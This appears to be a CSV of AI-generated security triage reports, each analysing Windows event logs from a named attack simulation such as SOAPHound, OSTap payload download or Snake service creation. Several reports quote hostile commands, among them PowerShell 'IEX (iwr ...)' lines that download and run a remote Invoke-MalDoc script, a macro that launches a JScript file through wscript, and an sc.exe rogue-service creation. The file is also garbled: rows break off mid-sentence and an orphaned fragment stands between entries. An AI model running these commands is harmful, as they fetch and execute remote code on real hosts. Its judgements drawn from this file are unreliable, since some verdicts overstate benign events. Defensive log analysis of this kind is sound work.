Directory Name,AI Response
SOAPHound - Dump BloodHound Data,"## Analysis

### Windows PowerShell Log:

1. **Event IDs 1043 to 1048**: These logs show a consistent command-line execution involving `powershell.exe` launching a binary named `SOAPHound.exe` from a temporary directory path (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.001\bin\SOAPHound.exe`). This particular file path and executable name do not usually correspond to known standard operations and seem arbitrary, indicating potential unauthorized use.

2. **Command-line Arguments**: The command is executing with sensitive parameters such as `--user`, `--password`, `--domain`, and `--dc`, which indicate that it may be attempting to gather domain credentials or interact with a domain controller. This type of activity could be indicative of credential dumping or lateral movement attempts.

3. **Output and Cache**: It is also outputting to directories (`C:\temp\cache.txt` and `C:\temp\test2`), which are temporary locations possibly used for staging or storing gathered data—another sign of suspicious behavior.

### Sysmon Log:

1. **Sysmon Event IDs 17967 to 17994**: The events indicate multiple process creations related to Windows utilities like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe`. While these utilities are common, their invocation could be used to enumerate user, host, or environment information.

2. **Involvement of `powershell.exe`**: Sysmon logs confirm the execution of `powershell.exe` with the same command that involved `SOAPHound.exe`. This further correlates the suspicious PowerShell activities with process execution events captured by Sysmon, strengthening the evidence of potentially malicious activity.

3. **High Integrity Level**: Several processes were executed with High integrity, indicating potential administrative privilege use, which aligns with patterns seen during privilege escalation or persistence activities.

### Detailed Assessment

The Windows event logs suggest that an unusual PowerShell script was executed involving `SOAPHound.exe`, a potentially malicious tool with parameters typically associated with credential manipulation or system reconnaissance on a network. The temporary execution paths, unusual process lineage, sensitive parameter usage, and high integrity level point towards an unauthorized or potentially malicious activity unfolding on the host named ""Server002"".

## Resolution

- **Resolution**: **MALICIOUS**
  - The nature of the actions—using PowerShell for executing unknown binaries with sensitive parameters—is a strong indicator of a compromise attempt or an ongoing attack aimed at credential theft or lateral movement.
  - **Immediate Actions**: 
    - Isolate the affected host from the network to prevent further lateral movement or data exfiltration.
    - Conduct a detailed forensic analysis to understand the full scope and timeline of the incident.
    - Reset the credentials used in the PowerShell command and any potentially exposed accounts.
    - Ensure all logs are preserved for further analysis and audit.
    - Review and enhance monitoring for similar activities across the network.

**Guidance**: Deploy endpoint detection and response (EDR) solutions to prevent and detect such activities in the future. Regularize the review of logs and ensure policies for least privilege and secure PowerShell usage are enforced organization-wide."
Simulate BlackByte Ransomware Print Bombing,"### Detailed Analysis

Upon reviewing the provided logs, several elements stand out that provide insight into either normal or suspicious activity on the system.

#### 1. System Log
- **EventID 243**: Identified within the System log, generated by Win32k, is relevant but typically associated with informative messages about the state of the window manager. It doesn’t provide explicit evidence of malicious activity in this context.

#### 2. Sysmon Logs
- **Multiple PowerShell Executions**: There is notable frequent invocation of `powershell.exe` combined with command line operations.
  - An instance includes running a loop that uses `cmd` to start `wordpad.exe` repeatedly with the print argument (`/p`). This type of action can indicate a script attempting to automate repetitive execution, sometimes seen in malicious scenarios or misconfigured scripts.
- **Microsoft Edge Update Executions**: Multiple `MicrosoftEdgeUpdate` executable instances, including `MicrosoftEdgeUpdateComRegisterShell64.exe`, are evident. While this could imply regular software updates, the frequency and command-line execution parameters suggest automations that warrant further inspection to ensure they align with legitimate update schedules.
  
#### 3. Security Logs
- **EventID 4798**: Logs user account enumeration. The repetition of information for `admin_test` implies a lookup of local group membership, suggesting potential account-related activities. When combined with the other entries, it could indicate an authorized script or background process examining group memberships for legitimate purposes, although frequency should be monitored.

#### 4. Application Logs
- **Software Protection Platform Event**: Displays standard informational logs about services and doesn’t inherently indicate any threat.
- **Edge Update Service Termination**: Indicates typical stop events for software after completing its routine tasks.

#### 5. PowerShell Logs
- **Multiple Entries for PowerShell State Changes**: The logging of PowerShell host starting with an inline script executing a loop to start `wordpad.exe`. The processing style and detailed command line suggest scripting actions unusual for legitimate user activities without specific administrative tasks involved.

### Assessment

- **Benign Activities**: The `TiWorker.exe`, `sppsvc.exe`, and other system-associated tasks such as Windows Servicing Stack operations seem part of routine system updates/maintenance architecture.
- **Suspicious Activities**: 
  - The high frequency and complex use of PowerShell for spawning processes seem suspicious. Especially executing repetitive WordPad launches may reflect probing activities or an operational error within self-developed administrative scripts.
  - Edge update invocations with varied command-line arguments in quick succession can indicate either rigorous update routines from a prescribed server or potential tampering.

### Final Resolution: SUSPICIOUS

The analyzed log entries reflect substantial invocation of scripting tools, such as PowerShell, in repetitive operations that may indicate either misconfiguration or initial reconnaissance attempts by unauthorized entities. Although clear evidence of compromise isn't confirmed, the patterns warrant further investigation to rule out potential risks.

### Guidance on How to Proceed:
1. **Deeper Investigation**: Specifically focus on the PowerShell scripts executed. Look up the source or original task schedules triggering them.
2. **User Activity Review**: Confirm user activity, `admin_test`, wasn't improperly conducting self-designed automation or wasn't compromised.
3. **Network and Endpoint Monitoring**: Correlate logs with network data for unusual outbound connections or unexplored endpoints that could signify covert channels.
4. **Evaluate Update Services**: Ensure that the versions and paths of Microsoft Edge Update are legitimate and conform to Windows Update guidelines, blocking atypical paths or origin access."
Mirror Blast Emulation,"In analyzing the provided Windows event logs, I've conducted a detailed examination for any potentially suspicious or malicious activities. Here are the key findings from each log segment:

### Sysmon Log:
1. **Multiple Instances of `wevtutil.exe` and `conhost.exe`:**
   - The Sysmon logs indicate multiple executions of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`.
   - `wevtutil.exe` is a legitimate utility for managing event logs, while `conhost.exe` is a legitimate Windows process. However, their frequent execution could be suspicious if not part of routine system administration activities.

2. **Execution of PowerShell:**
   - A `PowerShell.exe` process is observed with command line arguments that modify the registry (specifically `VBAWarnings` under the Office Excel security settings) and appear to execute an Excel macro (`mirrorblast_emulation.xlsm`).
   - This behavior is suspicious as it indicates potential macro-based attack attempts or lateral movement tactics.

3. **Execution of `whoami.exe` and `hostname.exe`:**
   - These utilities are used to gather system information and may indicate an attacker trying to understand the environment after gaining initial access.

### Security Log:
1. **Event ID 4616: System Time Change:**
   - The security log entries show changes in system time, indicating that services or administrative actions are modifying system time. Altering system time can be used to manipulate event logs or evade detection in specific scenarios.

### System Log:
1. **System Time Changes:**
   - Similar to the security log, the system log shows system time adjustments. This repeated action alongside the PowerShell execution increases suspicion of potential malicious activity aiming to cover tracks.

### Application Log:
- No suspicious events were noted specifically in the application logs.

### Windows PowerShell Log:
1. **Execution of Suspicious Commands:**
   - The PowerShell log confirms the execution of commands that modify Excel's security settings, pointing toward potential attempts at persistence or preparation for execution of Excel-based payloads.

### Assessment:
- The logs indicate suspicious behavior, primarily centered around PowerShell usage aiming to modify security settings and execute macros, which can be associated with initial compromise or payload execution attempts.
- The recurrence of registry modifications and macro execution, combined with system time changes, suggests attempts to establish a foothold or conduct further investigations or malicious actions within the environment.

### Resolution:
- **SUSPICIOUS**: The logs contain activities that don't seem benign, particularly the behavior involving PowerShell, registry modifications, and potential macro execution. Further investigation and correlation with other security events or alerts are recommended to confirm whether these activities are part of malicious operations.

### Recommended Actions:
1. **Isolate the affected host** to prevent potential lateral movement or exfiltration.
2. **Conduct a forensic investigation** to understand the full scope of activities on the system, including file integrity checks and deeper analysis of PowerShell scripts and executed payloads.
3. **Review user access and permissions**, particularly for the `SERVER002\admin_test` account, to ensure there have been no unauthorized privilege escalations or credential theft.
4. **Monitor logs and network traffic** closely for any further anomalies or attempts to communicate with known malicious domains or IP addresses.
5. **Update endpoint defenses** and consider enhancing monitoring and alerting capabilities around PowerShell and registry changes."
Encoded VBS code execution,"Upon analyzing the provided event logs for the Windows host ""Server002,"" I have identified significant indications of potentially malicious activity. Below is a detailed analysis highlighting suspicious or anomalous behavior and whether the events offer any evidence of compromise:

### Key Findings:

1. **Windows PowerShell Log Analysis:**
   - Multiple entries in the PowerShell logs reveal the execution of a script hosting service with PowerShell using this command:
     ```powershell
     powershell.exe & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr ""https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing); Invoke-Maldoc -macroFile ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.005\src\data.005-macrocode.txt"" -officeProduct ""Word"" -sub ""Exec""}
     ```
   - The `IEX` (Invoke-Expression) and `iwr` (Invoke-WebRequest) commands are used to execute a remote script hosted on GitHub, which is a common technique used by attackers to download and execute malicious payloads.
   - The specific script referred to as ""Invoke-MalDoc.ps1"" is suspicious, especially given that it targets Office macro files, indicating an attempt to exploit Office applications.

2. **Sysmon Log Analysis:**
   - Correlated PowerShell execution events with Sysmon logs confirm the execution of PowerShell processes under the user `SERVER002\admin_test`, indicating that this user account may be compromised.
   - Process creation events show powershell.exe processes with command lines that match those logged in the PowerShell logs, providing strong evidence of malicious script execution.
   - The involved process images (e.g., `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`), combined with the suspicious command execution, indicate a possible security incident involving script-based attacks.

3. **Absence of Additional Log Data:**
   - The Security and System logs are empty, which could either indicate normal behavior or potential interference to hide malicious activities. In a thorough investigation, we should ensure these logs are functioning properly.

### Assessment and Resolution:

- **Threat/Risk Identification:**
  - The detected PowerShell activity is highly indicative of an attempted or ongoing attack involving remote scripting and possible macro exploitation. This behavior is characteristic of malware delivery and exploitation attempts.
  - The use of PowerShell to download and execute scripts from a remote source without any authorized purpose, while targeting Office applications, raises a high suspicion of malicious intent.

- **Guidance and Next Steps:**
  1. **Immediate Containment:** Isolate the affected ""Server002"" from the network to prevent further network propagation of any potential malware.
  2. **Investigate User Activity:** Inspect user `SERVER002\admin_test` for potential compromise and unauthorized access or actions.
  3. **Review Suspicious Files:** Analyze the referenced scripts and macro files for malicious content and indicators of compromise.
  4. **Perform Full System Scan:** Use updated antivirus and threat detection tools to scan the system for malware or other security threats.
  5. **Monitor and Audit:** With access logs limited, ensure system and security logs are enabled, and enhanced logging is implemented to capture any further suspicious activities.

**Resolution: MALICIOUS**
- Based on the findings, there is compelling evidence of malicious activities present in the logs. Immediate action is recommended to address and mitigate the associated threats."
PowerShell Session Creation and Use,"Upon reviewing the provided logs, the following observations have been made:

### PowerShell Activity

1. **PowerShell Execution:**
   - PowerShell was executed with a command line that appears to be automated or scripted: `""powershell.exe"" & {New-PSSession -ComputerName $env:COMPUTERNAME, Test-Connection $env:COMPUTERNAME, Set-Content -Path $env:TEMP\\data_PowerShell_Session_Creation_and_Use -Value \""data PowerShell Session Creation and Use\"", Get-Content -Path $env:TEMP\\data_PowerShell_Session_Creation_and_Use, Remove-Item -Force $env:TEMP\\data_PowerShell_Session_Creation_and_Use}`

2. **Execution Context:**
   - The command was executed by `admin_test`, indicating it likely has elevated or admin privileges on `Server002`.

The command executed by PowerShell includes creating a session, performing a test connection, setting content to a temporary file, reading from it, and removing it. Each of these steps can be considered benign on their own, potentially as part of a script for health checks or system diagnostics. However, they could also be used in data exfiltration scripts or for obfuscation methods in malicious activities.

### Sysmon Log Entries

- **Processes of Interest:**
  - Several instances of `conhost.exe` and `wevtutil.exe` are executed, likely legitimate operations as they typically serve supporting roles for command-line interfaces and event log manipulations respectively.
  - The presence of `wevtutil.exe` could indicate potential attempts to clear or manipulate event logs, a common tactic in hiding malicious activities.

### Security Logs

- **Logon Events:**
  - Multiple anonymous logon entries (Event ID 4624) are indicative of possible attempts to connect to the machine via network or services without specific credentials.
  - These logs may suggest scanning or probing activities, which although common in a network environment, could indicate unauthorized exploration activity.

### Application and Other Logs

- **Application Activity:**
  - No significant malicious or suspicious entries were found outside regular Windows operations.

### Conclusion

Given the current evidence:
- The PowerShell activity, although potentially benign as part of regular scripting, warrants further investigation due to its potential misuses.
- The use of `wevtutil.exe` and multiple anonymous connection entries add to the level of suspicion.
  
Overall, while some activities might be legitimate, the combination of these factors (particularly the use of `wevtutil.exe` and scripted PowerShell) indicates that further investigation would be prudent to rule out potentially hidden or future malicious activity.

**Resolution**: **SUSPICIOUS** - The logs contain activities that do not look entirely right and should be investigated further to confirm their legitimacy."
OSTap Payload Download,"Upon reviewing the provided logs, several indicators point towards potentially suspicious activity that merits further investigation. Below is a detailed analysis of the logs:

1. **Security Log Analysis:**
   - **Event ID 4624 (Logon):** Multiple logon events utilizing `LogonType 5`. This logon type refers to a service startup, which can be typical for system processes. However, the presence of elevated privileges (`SeDebugPrivilege`, `SeImpersonatePrivilege`, etc.) requires validation against expected behavior and user actions during this time frame.
   - **Event ID 4672 (Special Privileges Assigned):** High-level privileges are often associated with system processes, but the extent and frequency of special privilege assignment indicate potential for misuse, suggesting a need for audit trail validation.
   - **Event ID 5379 (Credential Validation):** Multiple attempts to access `MicrosoftAccount:user=02txoixylodcstop`. A `ReturnCode 3221226021` indicates a failure which often translates to invalid credentials. Repeated failures might infer brute force attempts or misconfigured automation.

2. **Sysmon Log Evaluation:**
   - **Event ID 1 (Process Creation):** The execution of scripts and scheduled tasks points to potentially scripted or automated activities:
     - A script (cscript.exe) executed appears to be downloading and executing a JavaScript from a non-standard network location (`raw.githubusercontent.com`). This could indicate an attempt for malicious download or a misconfigured script.
     - Numerous task scheduler operations (e.g., deletions and recreations of tasks) under `schtasks.exe` may suggest task manipulation, potentially for persistence or schedule alteration of malicious processes.
   - **Command Line Activities:**
     - Unusual use of cmd.exe and scripts like `OSTapGet.js` suggest possible attempts at access or execution of payloads not characteristic for typical administrative activity.

3. **System and Application Log Review:**
   - **Windows Updates (System Log):** Standard update operations seem benign, providing context for background activities.
   - **Edge Update Activities (Application Log):** Frequent execution of Edge Update processes can indicate automated software updating, which is typically benign. However, consistent with other suspicious activities, it raises concern for whether these updates have been tampered with to introduce malicious elements.

4. **Potentially Malicious Indicators:**
   - Custom or non-standard scripts and tasks executed may signify initial stages of a compromise or misconfiguration.
   - Elevated privileges used extensively during system processes warrant verification against expected configurations and user operations.
   - Failed credential validations and repetitive task scheduler usage suggesting unauthorized attempts or script mismanagement.

**Assessment and Recommendations:**
The behavior observed in these logs is deemed **SUSPICIOUS**. While they contain indicators that do not conclusively confirm malicious activity (such as typical system-initiated events), the pattern of failed logins, scripting from non-standard URLs, and the task manipulations could signify improper or unauthorized operations.

**Next Steps:**
- **Log Correlation:** Cross-reference these logs with any network or application-specific logs to identify additional context or potential external communications.
- **User Activity Verification:** Confirm if the user actions during this period align with business operations or if an account was potentially compromised.
- **Configuration and Task Verification:** Validate if the created and deleted tasks under `schtasks.exe` were authorized or generated by known automation.
- **Credential Security Review:** Investigate and secure accounts that generated logon failures.

This conclusion necessitates deeper examination and continual monitoring, leveraging threat intelligence and endpoint detection tools to ascertain the nature and scope of the activity observed."
ATHPowerShellCommandLineParameter -Command parameter variations,"Upon reviewing the provided logs, here is the detailed analysis:

### Sysmon Log Analysis:
1. **Frequent Use of `wevtutil.exe` and `powershell.exe`:**
   - Logs depict various instances of `wevtutil.exe` and `powershell.exe` execution by the user `SERVER002\admin_test`.
   - The execution of PowerShell, especially with minimal command-line details, can be suspicious if it is not part of normal administration activity. PowerShell is known for its powerful scripting capabilities and potential misuse.
  
2. **Use of `whoami.exe` and `hostname.exe`:**
   - Tools like `whoami.exe` and `hostname.exe` are frequently used for system reconnaissance to determine the system's identity and user context. They can be benign in administrative scripts.

3. **Presence of Utility `conhost.exe`:** 
   - `conhost.exe` accompanies command-line processes and its presence is common with command utilities, which might be expected when using command-line tools like PowerShell.

4. **Command for PowerShell:**
   - The command used in PowerShell (`& {Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -Execute -ErrorAction Stop}`) does not inherently suggest malice, but lacks clarity about its operation.
   - The use of the temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\`) as a working directory is often seen during script operations, but could be a place for script execution by an attacker.

### Windows PowerShell Log Analysis:
- Logs indicate the starting of several providers (Registry, Alias, Environment, etc.), typical during PowerShell session initiation.
- The command tracked seems non-standard, and without a known corresponding script, may appear suspicious.

### System Log Analysis:
- Windows Update logs show updates related to standard Microsoft applications, which typically marks usual system update behavior.

### Application Log Analysis:
- The involvement of Software Protection Platform Service is a normal background operation unless there is evidence of errors or failures, in this context appears standard.

### Security Log Analysis:
- **Event ID 4624 and 4672:**
  - A successful logon event is logged (`4624`), and special privileges assigned (`4672`) for NT AUTHORITY\SYSTEM. This is normal for system processes.
- **Repeated Event ID 5379:**
  - Indicates Windows Live credential checks, which result in failure (`ReturnCode:""3221226021""`) associated with MicrosoftAccount. The failure might arise from network configuration issues, which warrants further confirmation.
  
### Assessment:
- **Powershell Usage:** The frequent execution of PowerShell with an obscure command implies suspicious behavior and should be further evaluated.
- **System Reconnaissance Commands:** While `whoami` and `hostname` are benign, when used together with suspect PowerShell activity, they may suggest system reconnaissance by a user.

### Conclusion:
**Resolution: SUSPICIOUS**

There are elements such as potentially obfuscated PowerShell usage and system reconnaissance commands (`whoami`, `hostname`) that warrant further investigation. This mixed with standard update logs suggests no immediate evidence of compromise but requires deeper inspection to confirm the intent behind the PowerShell execution and associated processes. It would be wise to follow-up by:
- Verifying the legitimacy of commands executed in PowerShell.
- Reviewing any scripts or scheduled tasks associated with `SERVER002\admin_test`.
- Monitoring for any unusual activity or unauthorized access attempts."
AutoIt Script Execution,"After analyzing the provided Windows event logs from various sources, the following observations and conclusions are drawn:

### Key Observations:

1. **Application Log:**
   - The Windows Defender status shows as ""SECURITY_PRODUCT_STATE_ON."" This indicates that Windows Defender is active and running, which is a standard and benign activity.

2. **Security Log:**
   - **Event ID 4624** indicates a successful logon using the Local System account (S-1-5-18), which is typical for system-level operations (e.g., services starting). The logon type is 5, indicating a service has started, which is normal.
   - **Event ID 4672** lists special privileges assigned to the process. These privileges include high-level system privileges (e.g., SeDebugPrivilege, SeLoadDriverPrivilege), which are standard for system accounts.
   - **Event ID 5379** indicates credential read operations, which failed with a return code corresponding to STATUS_NONE_MAPPED (3221226021). This suggests failed attempts to authenticate via a Microsoft Account, likely due to incorrect or unavailable credentials. There are multiple entries for these failures, which could warrant further investigation regarding why there were repeated attempts.
   - **Event ID 4798** is related to querying user account details by authorized processes (`taskhostw.exe`), and there is no apparent misuse or abnormality present.

3. **Windows PowerShell Log:**
   - PowerShell commands executed `AutoIt3.exe` with a script `calc.au3`. AutoIt is often used for automating GUI tasks or simulating keystrokes and mouse movements, which can be benign. However, executed from a script in the temp directory can indicate a potential security concern if not explicitly approved or known. This warrants further investigation into the legitimacy of this execution and the script content.

4. **Sysmon Log:**
   - Processes such as `powershell.exe`, `conhost.exe`, `wevtutil.exe`, and standard Windows utilities (`whoami.exe`, `hostname.exe`) are shown executed by an account `admin_test`. The sequence of these particular processes could suggest post-exploitation activity if linked contextually.
   - The repeated executions and the presence of utilities used for enumeration (`whoami.exe`), system commands (`hostname.exe`), logging operations (`wevtutil.exe`), and monitoring activity (`AutoIt3.exe` suggested by PowerShell logs) might collectively suggest unauthorized activities depending on their context and intent.

### Conclusion:

Given the context of the logs and the observed activity, the recommended resolution is **SUSPICIOUS** due to:

- The unusual and repeated failed attempts for credential access and usage (Event ID 5379).
- The execution of a script (`calc.au3`) with `AutoIt3.exe` from a temp directory without clear purpose.
- The observed pattern of PowerShell and other system utilities warrant a deeper review for possible lateral movement or privilege escalation attempts.

### Guidance on How to Proceed:

- Conduct a thorough review of the `calc.au3` script and the associated logs to confirm its legitimacy and usage context.
- Verify the activities and corresponding authorizations for the `admin_test` account to ensure its actions are legitimate.
- Check the system for any unauthorized users or software.
- Implement additional monitoring and alerting for unusual PowerShell activity, especially invoking or using executables from temp directories.
- Strengthen account security measures, including enforcing multi-factor authentication and monitoring for unusual login attempts. 

Further investigative steps should be taken to ensure no indicators of compromise or malicious activities are concealed in this behavior."
Snake Malware Service Create,"### Detailed Analysis:

Upon examining the logs, I focused primarily on indicators of anomalous and potentially malicious activity. The Sysmon logs show a series of executions involving system utilities, which can sometimes be benign or indicative of administrative actions. However, certain details in these logs suggest possible malicious intent rather than legitimate administrative activity.

#### Key Observations:

1. **Use of ""cmd.exe"" for Service Creation**:
   - **Log Entry**: `C:\\Windows\\System32\\cmd.exe /c sc.exe create ""WerFaultSvc"" binPath= ""$env:windir\\WinSxS\\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\\WerFault.exe"" DisplayName= ""WerFault Service"" start= auto`
   - **Analysis**: The use of `cmd.exe` to run `sc.exe` for creating a service named ""WerFaultSvc"" from an unusual directory (`WinSxS`) raises suspicion. Normally, ""WerFault.exe"" is related to error reporting, but the directory and method of execution suggest this could be a disguised or rogue service.

2. **Repeated Use of ""whoami.exe"" and ""hostname.exe""**:
   - **Log Entries**: Multiple executions of `whoami.exe` and `hostname.exe` were detected.
   - **Analysis**: While these utilities by themselves are not inherently malicious, merged with the overall context, including their execution alongside other potentially malicious activities (such as the creation of a new service), they can serve to establish a footprint of the environment, which is consistent with reconnaissance behavior.

3. **Execution of ""wevtutil.exe""**:
   - **Log Entry**: Executions of `wevtutil.exe` particularly to export logs, e.g., `""wevtutil.exe epl Microsoft-Windows-Sysmon/Operational C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\TempLog.evtx""`.
   - **Analysis**: The use of `wevtutil.exe` to save event logs can be legitimate; however, in the context of suspicious service creation and information retrieval (via whoami and hostname), it indicates potential log tampering or collection prior to exfiltration.

4. **Service Control Manager Event**:
   - **Log Entry**: Creation of a service with `StartType` set to `auto` and using `LocalSystem` privileges.
   - **Analysis**: Services that are added without a clear administrative context and are set to auto-start, especially under a privileged account like LocalSystem, can be highly suspect.

5. **High Integrity Level**:
   - **Observation**: Many processes, including `cmd.exe` and `sc.exe`, were executed with High Integrity.
   - **Analysis**: High Integrity Level suggests execution with elevated privileges, adding to the risk profile of the observed activities.

### Assessment and Resolution:

Based on the logs provided, there are strong indicators of potentially malicious activities. The creation of a service under potentially deceptive parameters, coupled with system information gathering and potential log manipulation efforts, suggest efforts consistent with a compromise or preparation for one.

**Resolution**: **MALICIOUS** 

### Guidance on How to Proceed:

1. **Immediate Response**:
   - **Containment**: Limit any potential damage by isolating Server002 from the network. Prevent further execution and persistence of malicious activities.
   - **Service Validation**: Investigate the ""WerFaultSvc"" and confirm its necessity and legitimacy. If deemed unnecessary or suspicious, disable and remove it ASAP.

2. **Forensic Examination**:
   - **Analyze**: More detailed forensic analysis on the machine should be performed to understand the entry point and scope of any compromise.
   - **Audit Logs**: Look into historical logs to find how this setup might have been initiated and if there are similar patterns elsewhere in the network.

3. **Remediation and Hardening**:
   - **Security Patches**: Ensure all machines, especially Server002, are fully patched against known vulnerabilities.
   - **Review and Refine Policies**: Implement restrictive policies for service creation and privilege management to prevent unauthorized changes.

4. **Monitoring and Alerting**:
   - **Implement Alerts**: Establish alerts for any further unexpected use of utilities like `whoami`, `hostname`, or service creation commands, and monitor closely.

By taking these actions, the organization can mitigate the current threat, understand its impact level, and prevent similar issues in the future."
Extract Memory via VBA,"### Detailed Analysis of Logs

#### Suspicious Behavior

1. **PowerShell Activity**:
   - The event log shows PowerShell executed with a suspicious command line that involves downloading and executing a script from a remote URL (`""https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/Invoke-MalDoc.ps1""`). The usage of `IEX` (Invoke-Expression) in PowerShell is a red flag as it can be used to execute code dynamically, and downloading scripts from an external source is typically associated with malicious actions.
   - The execution context of this PowerShell process (`SERVER002\admin_test`) and its high integrity level further raise concerns, as it can perform privileged actions.

2. **Process Activity**:
   - Multiple instances of Microsoft Edge Update processes are running as `NT AUTHORITY\SYSTEM`. While these processes could be part of legitimate update operations, their overlapping and frequent execution at short intervals might suggest a misuse or exploitation.
   - The presence of the Microsoft Edge Update executable in a temporary directory (`C:\Program Files (x86)\Microsoft\Temp\`) could potentially indicate tampering or use of the process to execute unauthorized operations.

3. **Repeated Credential Access Attempts**:
   - There are several events logged (Event ID 5379) regarding failed credential read operations for `MicrosoftAccount:user=02txoixylodcstop`. These consistent attempts could indicate unauthorized access or enumeration attempts using stored credentials.

#### Malicious Indicators

- **Suspicious PowerShell Invocation**: The PowerShell command downloads and invokes a script from the internet, which matches the behavior of known cyber threats, particularly those utilizing malicious documents for payload delivery.
- **Persistence and Lateral Movement**: High-level privileges (such as SYSTEM) used in executing various processes suggest potential attempts at maintaining persistence or enabling lateral movement within the network.

### Threat Assessment

Based on the logs, there are clear indicators of suspicious and potentially malicious activity, predominantly driven by unauthorized PowerShell script execution and unusual process behaviors:

- **PowerShell Script Execution**: This aligns with tactics often used in attacks to execute payloads post-compromise. The downloading and execution of scripts from GitHub repositories without any clear administrative purpose or justification present high risks.
- **Privilege Misuse**: The execution under SYSTEM context with operations potentially extending beyond routine updates suggests compromise or misuse.
- **Reconnaissance Activity**: Multiple failed credential access attempts could indicate reconnaissance activities such as credential dumping.

### Guidance for Further Action

1. **Immediate Isolation**: Temporarily isolate the affected machine (Server002) to prevent potential further spread or data exfiltration.
2. **Script Analysis**: Retrieve and analyze the downloaded script (`Invoke-MalDoc.ps1`) from GitHub to determine its functionality and any payloads.
3. **Audit User Activity**: Investigate the `admin_test` account for any unauthorized access or anomalies in login behavior.
4. **Review Update Processes**: Verify the legitimacy of the Microsoft Edge Update processes and their execution flags in the context of system patching.
5. **Seek Threat Intelligence**: Employ threat intelligence services to cross-check the domain and script URLs for any known malicious indicators or past reported incidents.

### Resolution

The situation with the presented logs and findings is assessed as **MALICIOUS** due to unauthorized execution of potentially harmful scripts and anomalous process and credential behaviors indicating a compromise. This warrants immediate triage and remediation efforts as outlined."

- **Suspicious Activity**: The PowerShell logs show the execution of a script via PowerShell.exe, which includes:
  - Setting the security protocol to TLS12.
  - Downloading and executing a script from a GitHub URL using `Invoke-Expression` (`IEX`).
  - Creating a macrocode that executes `cmd.exe /c choice /C Y /N /D Y /T 3`, which could potentially be used for automated execution or evasion.
  - Using a script named `Invoke-MalDoc` which is suggestive of potential malicious document handling.

This activity is highly suspicious because:
  - Downloading and executing scripts from the internet, especially from GitHub, can be used to execute malicious code or perform malicious actions.
  - The specific use of `Invoke-MalDoc` and macro code suggests preparation for document-based attacks, possibly through malicious Office macros.

#### Sysmon Logs:
- **Observations**: The Sysmon logs detail several processes starting with focus on:
  - PowerShell execution and subprocesses such as `conhost.exe`.
  - Executions related to system services like `sppsvc.exe`, `TiWorker.exe`, and `TrustedInstaller.exe`.
  - Microsoft Edge update processes.

The Sysmon entry of particular concern is the execution of PowerShell with the same suspicious command line seen in the PowerShell log entries.

#### Application Logs:
- No direct evidence of malicious activities related to the system compromise. It contains routine logging by Software Protection Platform Service.

### Assessment:

- The PowerShell logs clearly indicate the potential execution of a malicious script. The downloading and execution of a script from the internet without verification, using PowerShell, matches known patterns of malware distribution tactics. 
- The use of `Invoke-MalDoc` is a familiar tactic for malware attempting to leverage document-based vulnerabilities or macros for execution.
- The Sysmon logs corroborate the execution of the suspicious PowerShell script as recorded in real-time.

### Threat/Risk Identified:
There is a critical risk that the scripts executed could contain or download malware, potentially leading to system compromise, data exfiltration, or further network penetration.

### Guidance on How to Proceed:
1. **Immediate Containment**: Disconnect the affected host (Server002) from the network to prevent further spreading of the suspected malicious activity.
2. **Forensic Analysis**: Perform a deeper forensic analysis of Server002 to examine the downloaded script’s activities and any changes made to the system.

OSTAP JS version,"### Analysis of Logs

#### Suspicious Behavior

1. **Unusual PowerShell Execution:**
   - There is a PowerShell command that seems malicious, attempting to download and execute a script from a raw GitHub URL: 
     ```
     powershell.exe & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12, 
     IEX (iwr \""https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/Invoke-MalDoc.ps1\""
      -UseBasicParsing), $macrocode = \""Open \\\""C:\\Users\\Public\\art.jse\\\"" For Output As #1`n Write #1, 
      \\\""WScript.Quit\\\""`n Close #1`n a = Shell(\\\""cmd.exe /c wscript.exe //E:jscript C:\\Users\\Public\\art.jse\\\"" 
      , vbNormalFocus)`n\\\"", Invoke-MalDoc -macroCode $macrocode -officeProduct \\\""Word\\\""}""
     ```
   - This command could be indicative of an attempt to execute a potentially harmful script via PowerShell, using `Invoke-MalDoc` which is a known technique used in PowerShell for executing malicious macros.

2. **Wevtutil and Conhost Patterns:**
   - Frequent instances of `wevtutil.exe` and `conhost.exe` being executed. Although these are genuine Windows binaries, frequent execution, especially in pairs and without clear justification, can often be associated with malware techniques leveraging these binaries for log clearing or as subprocess handlers.

3. **Significant Privilege Assignments:**
   - The log entries for Event ID `4672` indicate that the SYSTEM account was granted several high-level privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and `SeRestorePrivilege`, which could be exploited for malicious activities if these were not a result of legitimate administrative activities.

#### Indicators of Malicious Activity

- **Potential Malicious PowerShell Command:**
  - The PowerShell activity, especially involving `Invoke-MalDoc`, implies possible execution of a malicious document aimed at exploiting system vulnerabilities.
 
- **Command and Control (C2) Pattern:**
  - The script being executed from an external URL suggests C2 activity patterns where infected hosts download and execute instructions from a remote malicious server.

### Assessment

- **Current Threat Level:** High
  - The evidence suggests potential malicious activity, primarily due to the suspicious PowerShell commands intending to execute scripts from an external source. These actions align with known patterns of malicious PowerShell script usage for compromising systems.

### Recommendation

- **Immediate Action:**

Headless Chrome code execution via VBA,"### Analysis of Logs:

#### 1. Suspicious PowerShell Activity:
- In the provided PowerShell logs, there are multiple instances of PowerShell being executed with the command to download and execute a script from a GitHub URL (`https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/Invoke-MalDoc.ps1`). The command uses `IEX (iwr ... -UseBasicParsing)` which is known for executing code retrieved from a remote server. This is indicative of potentially malicious behavior as it suggests downloading and executing a script that could be harmful.
- The command `Invoke-Maldoc -macroFile ...` also suggests that a macro document is being executed, which is a common technique in malware attacks to gain a foothold or escalate privileges.

#### 2. Unusual Execution of PowerShell:
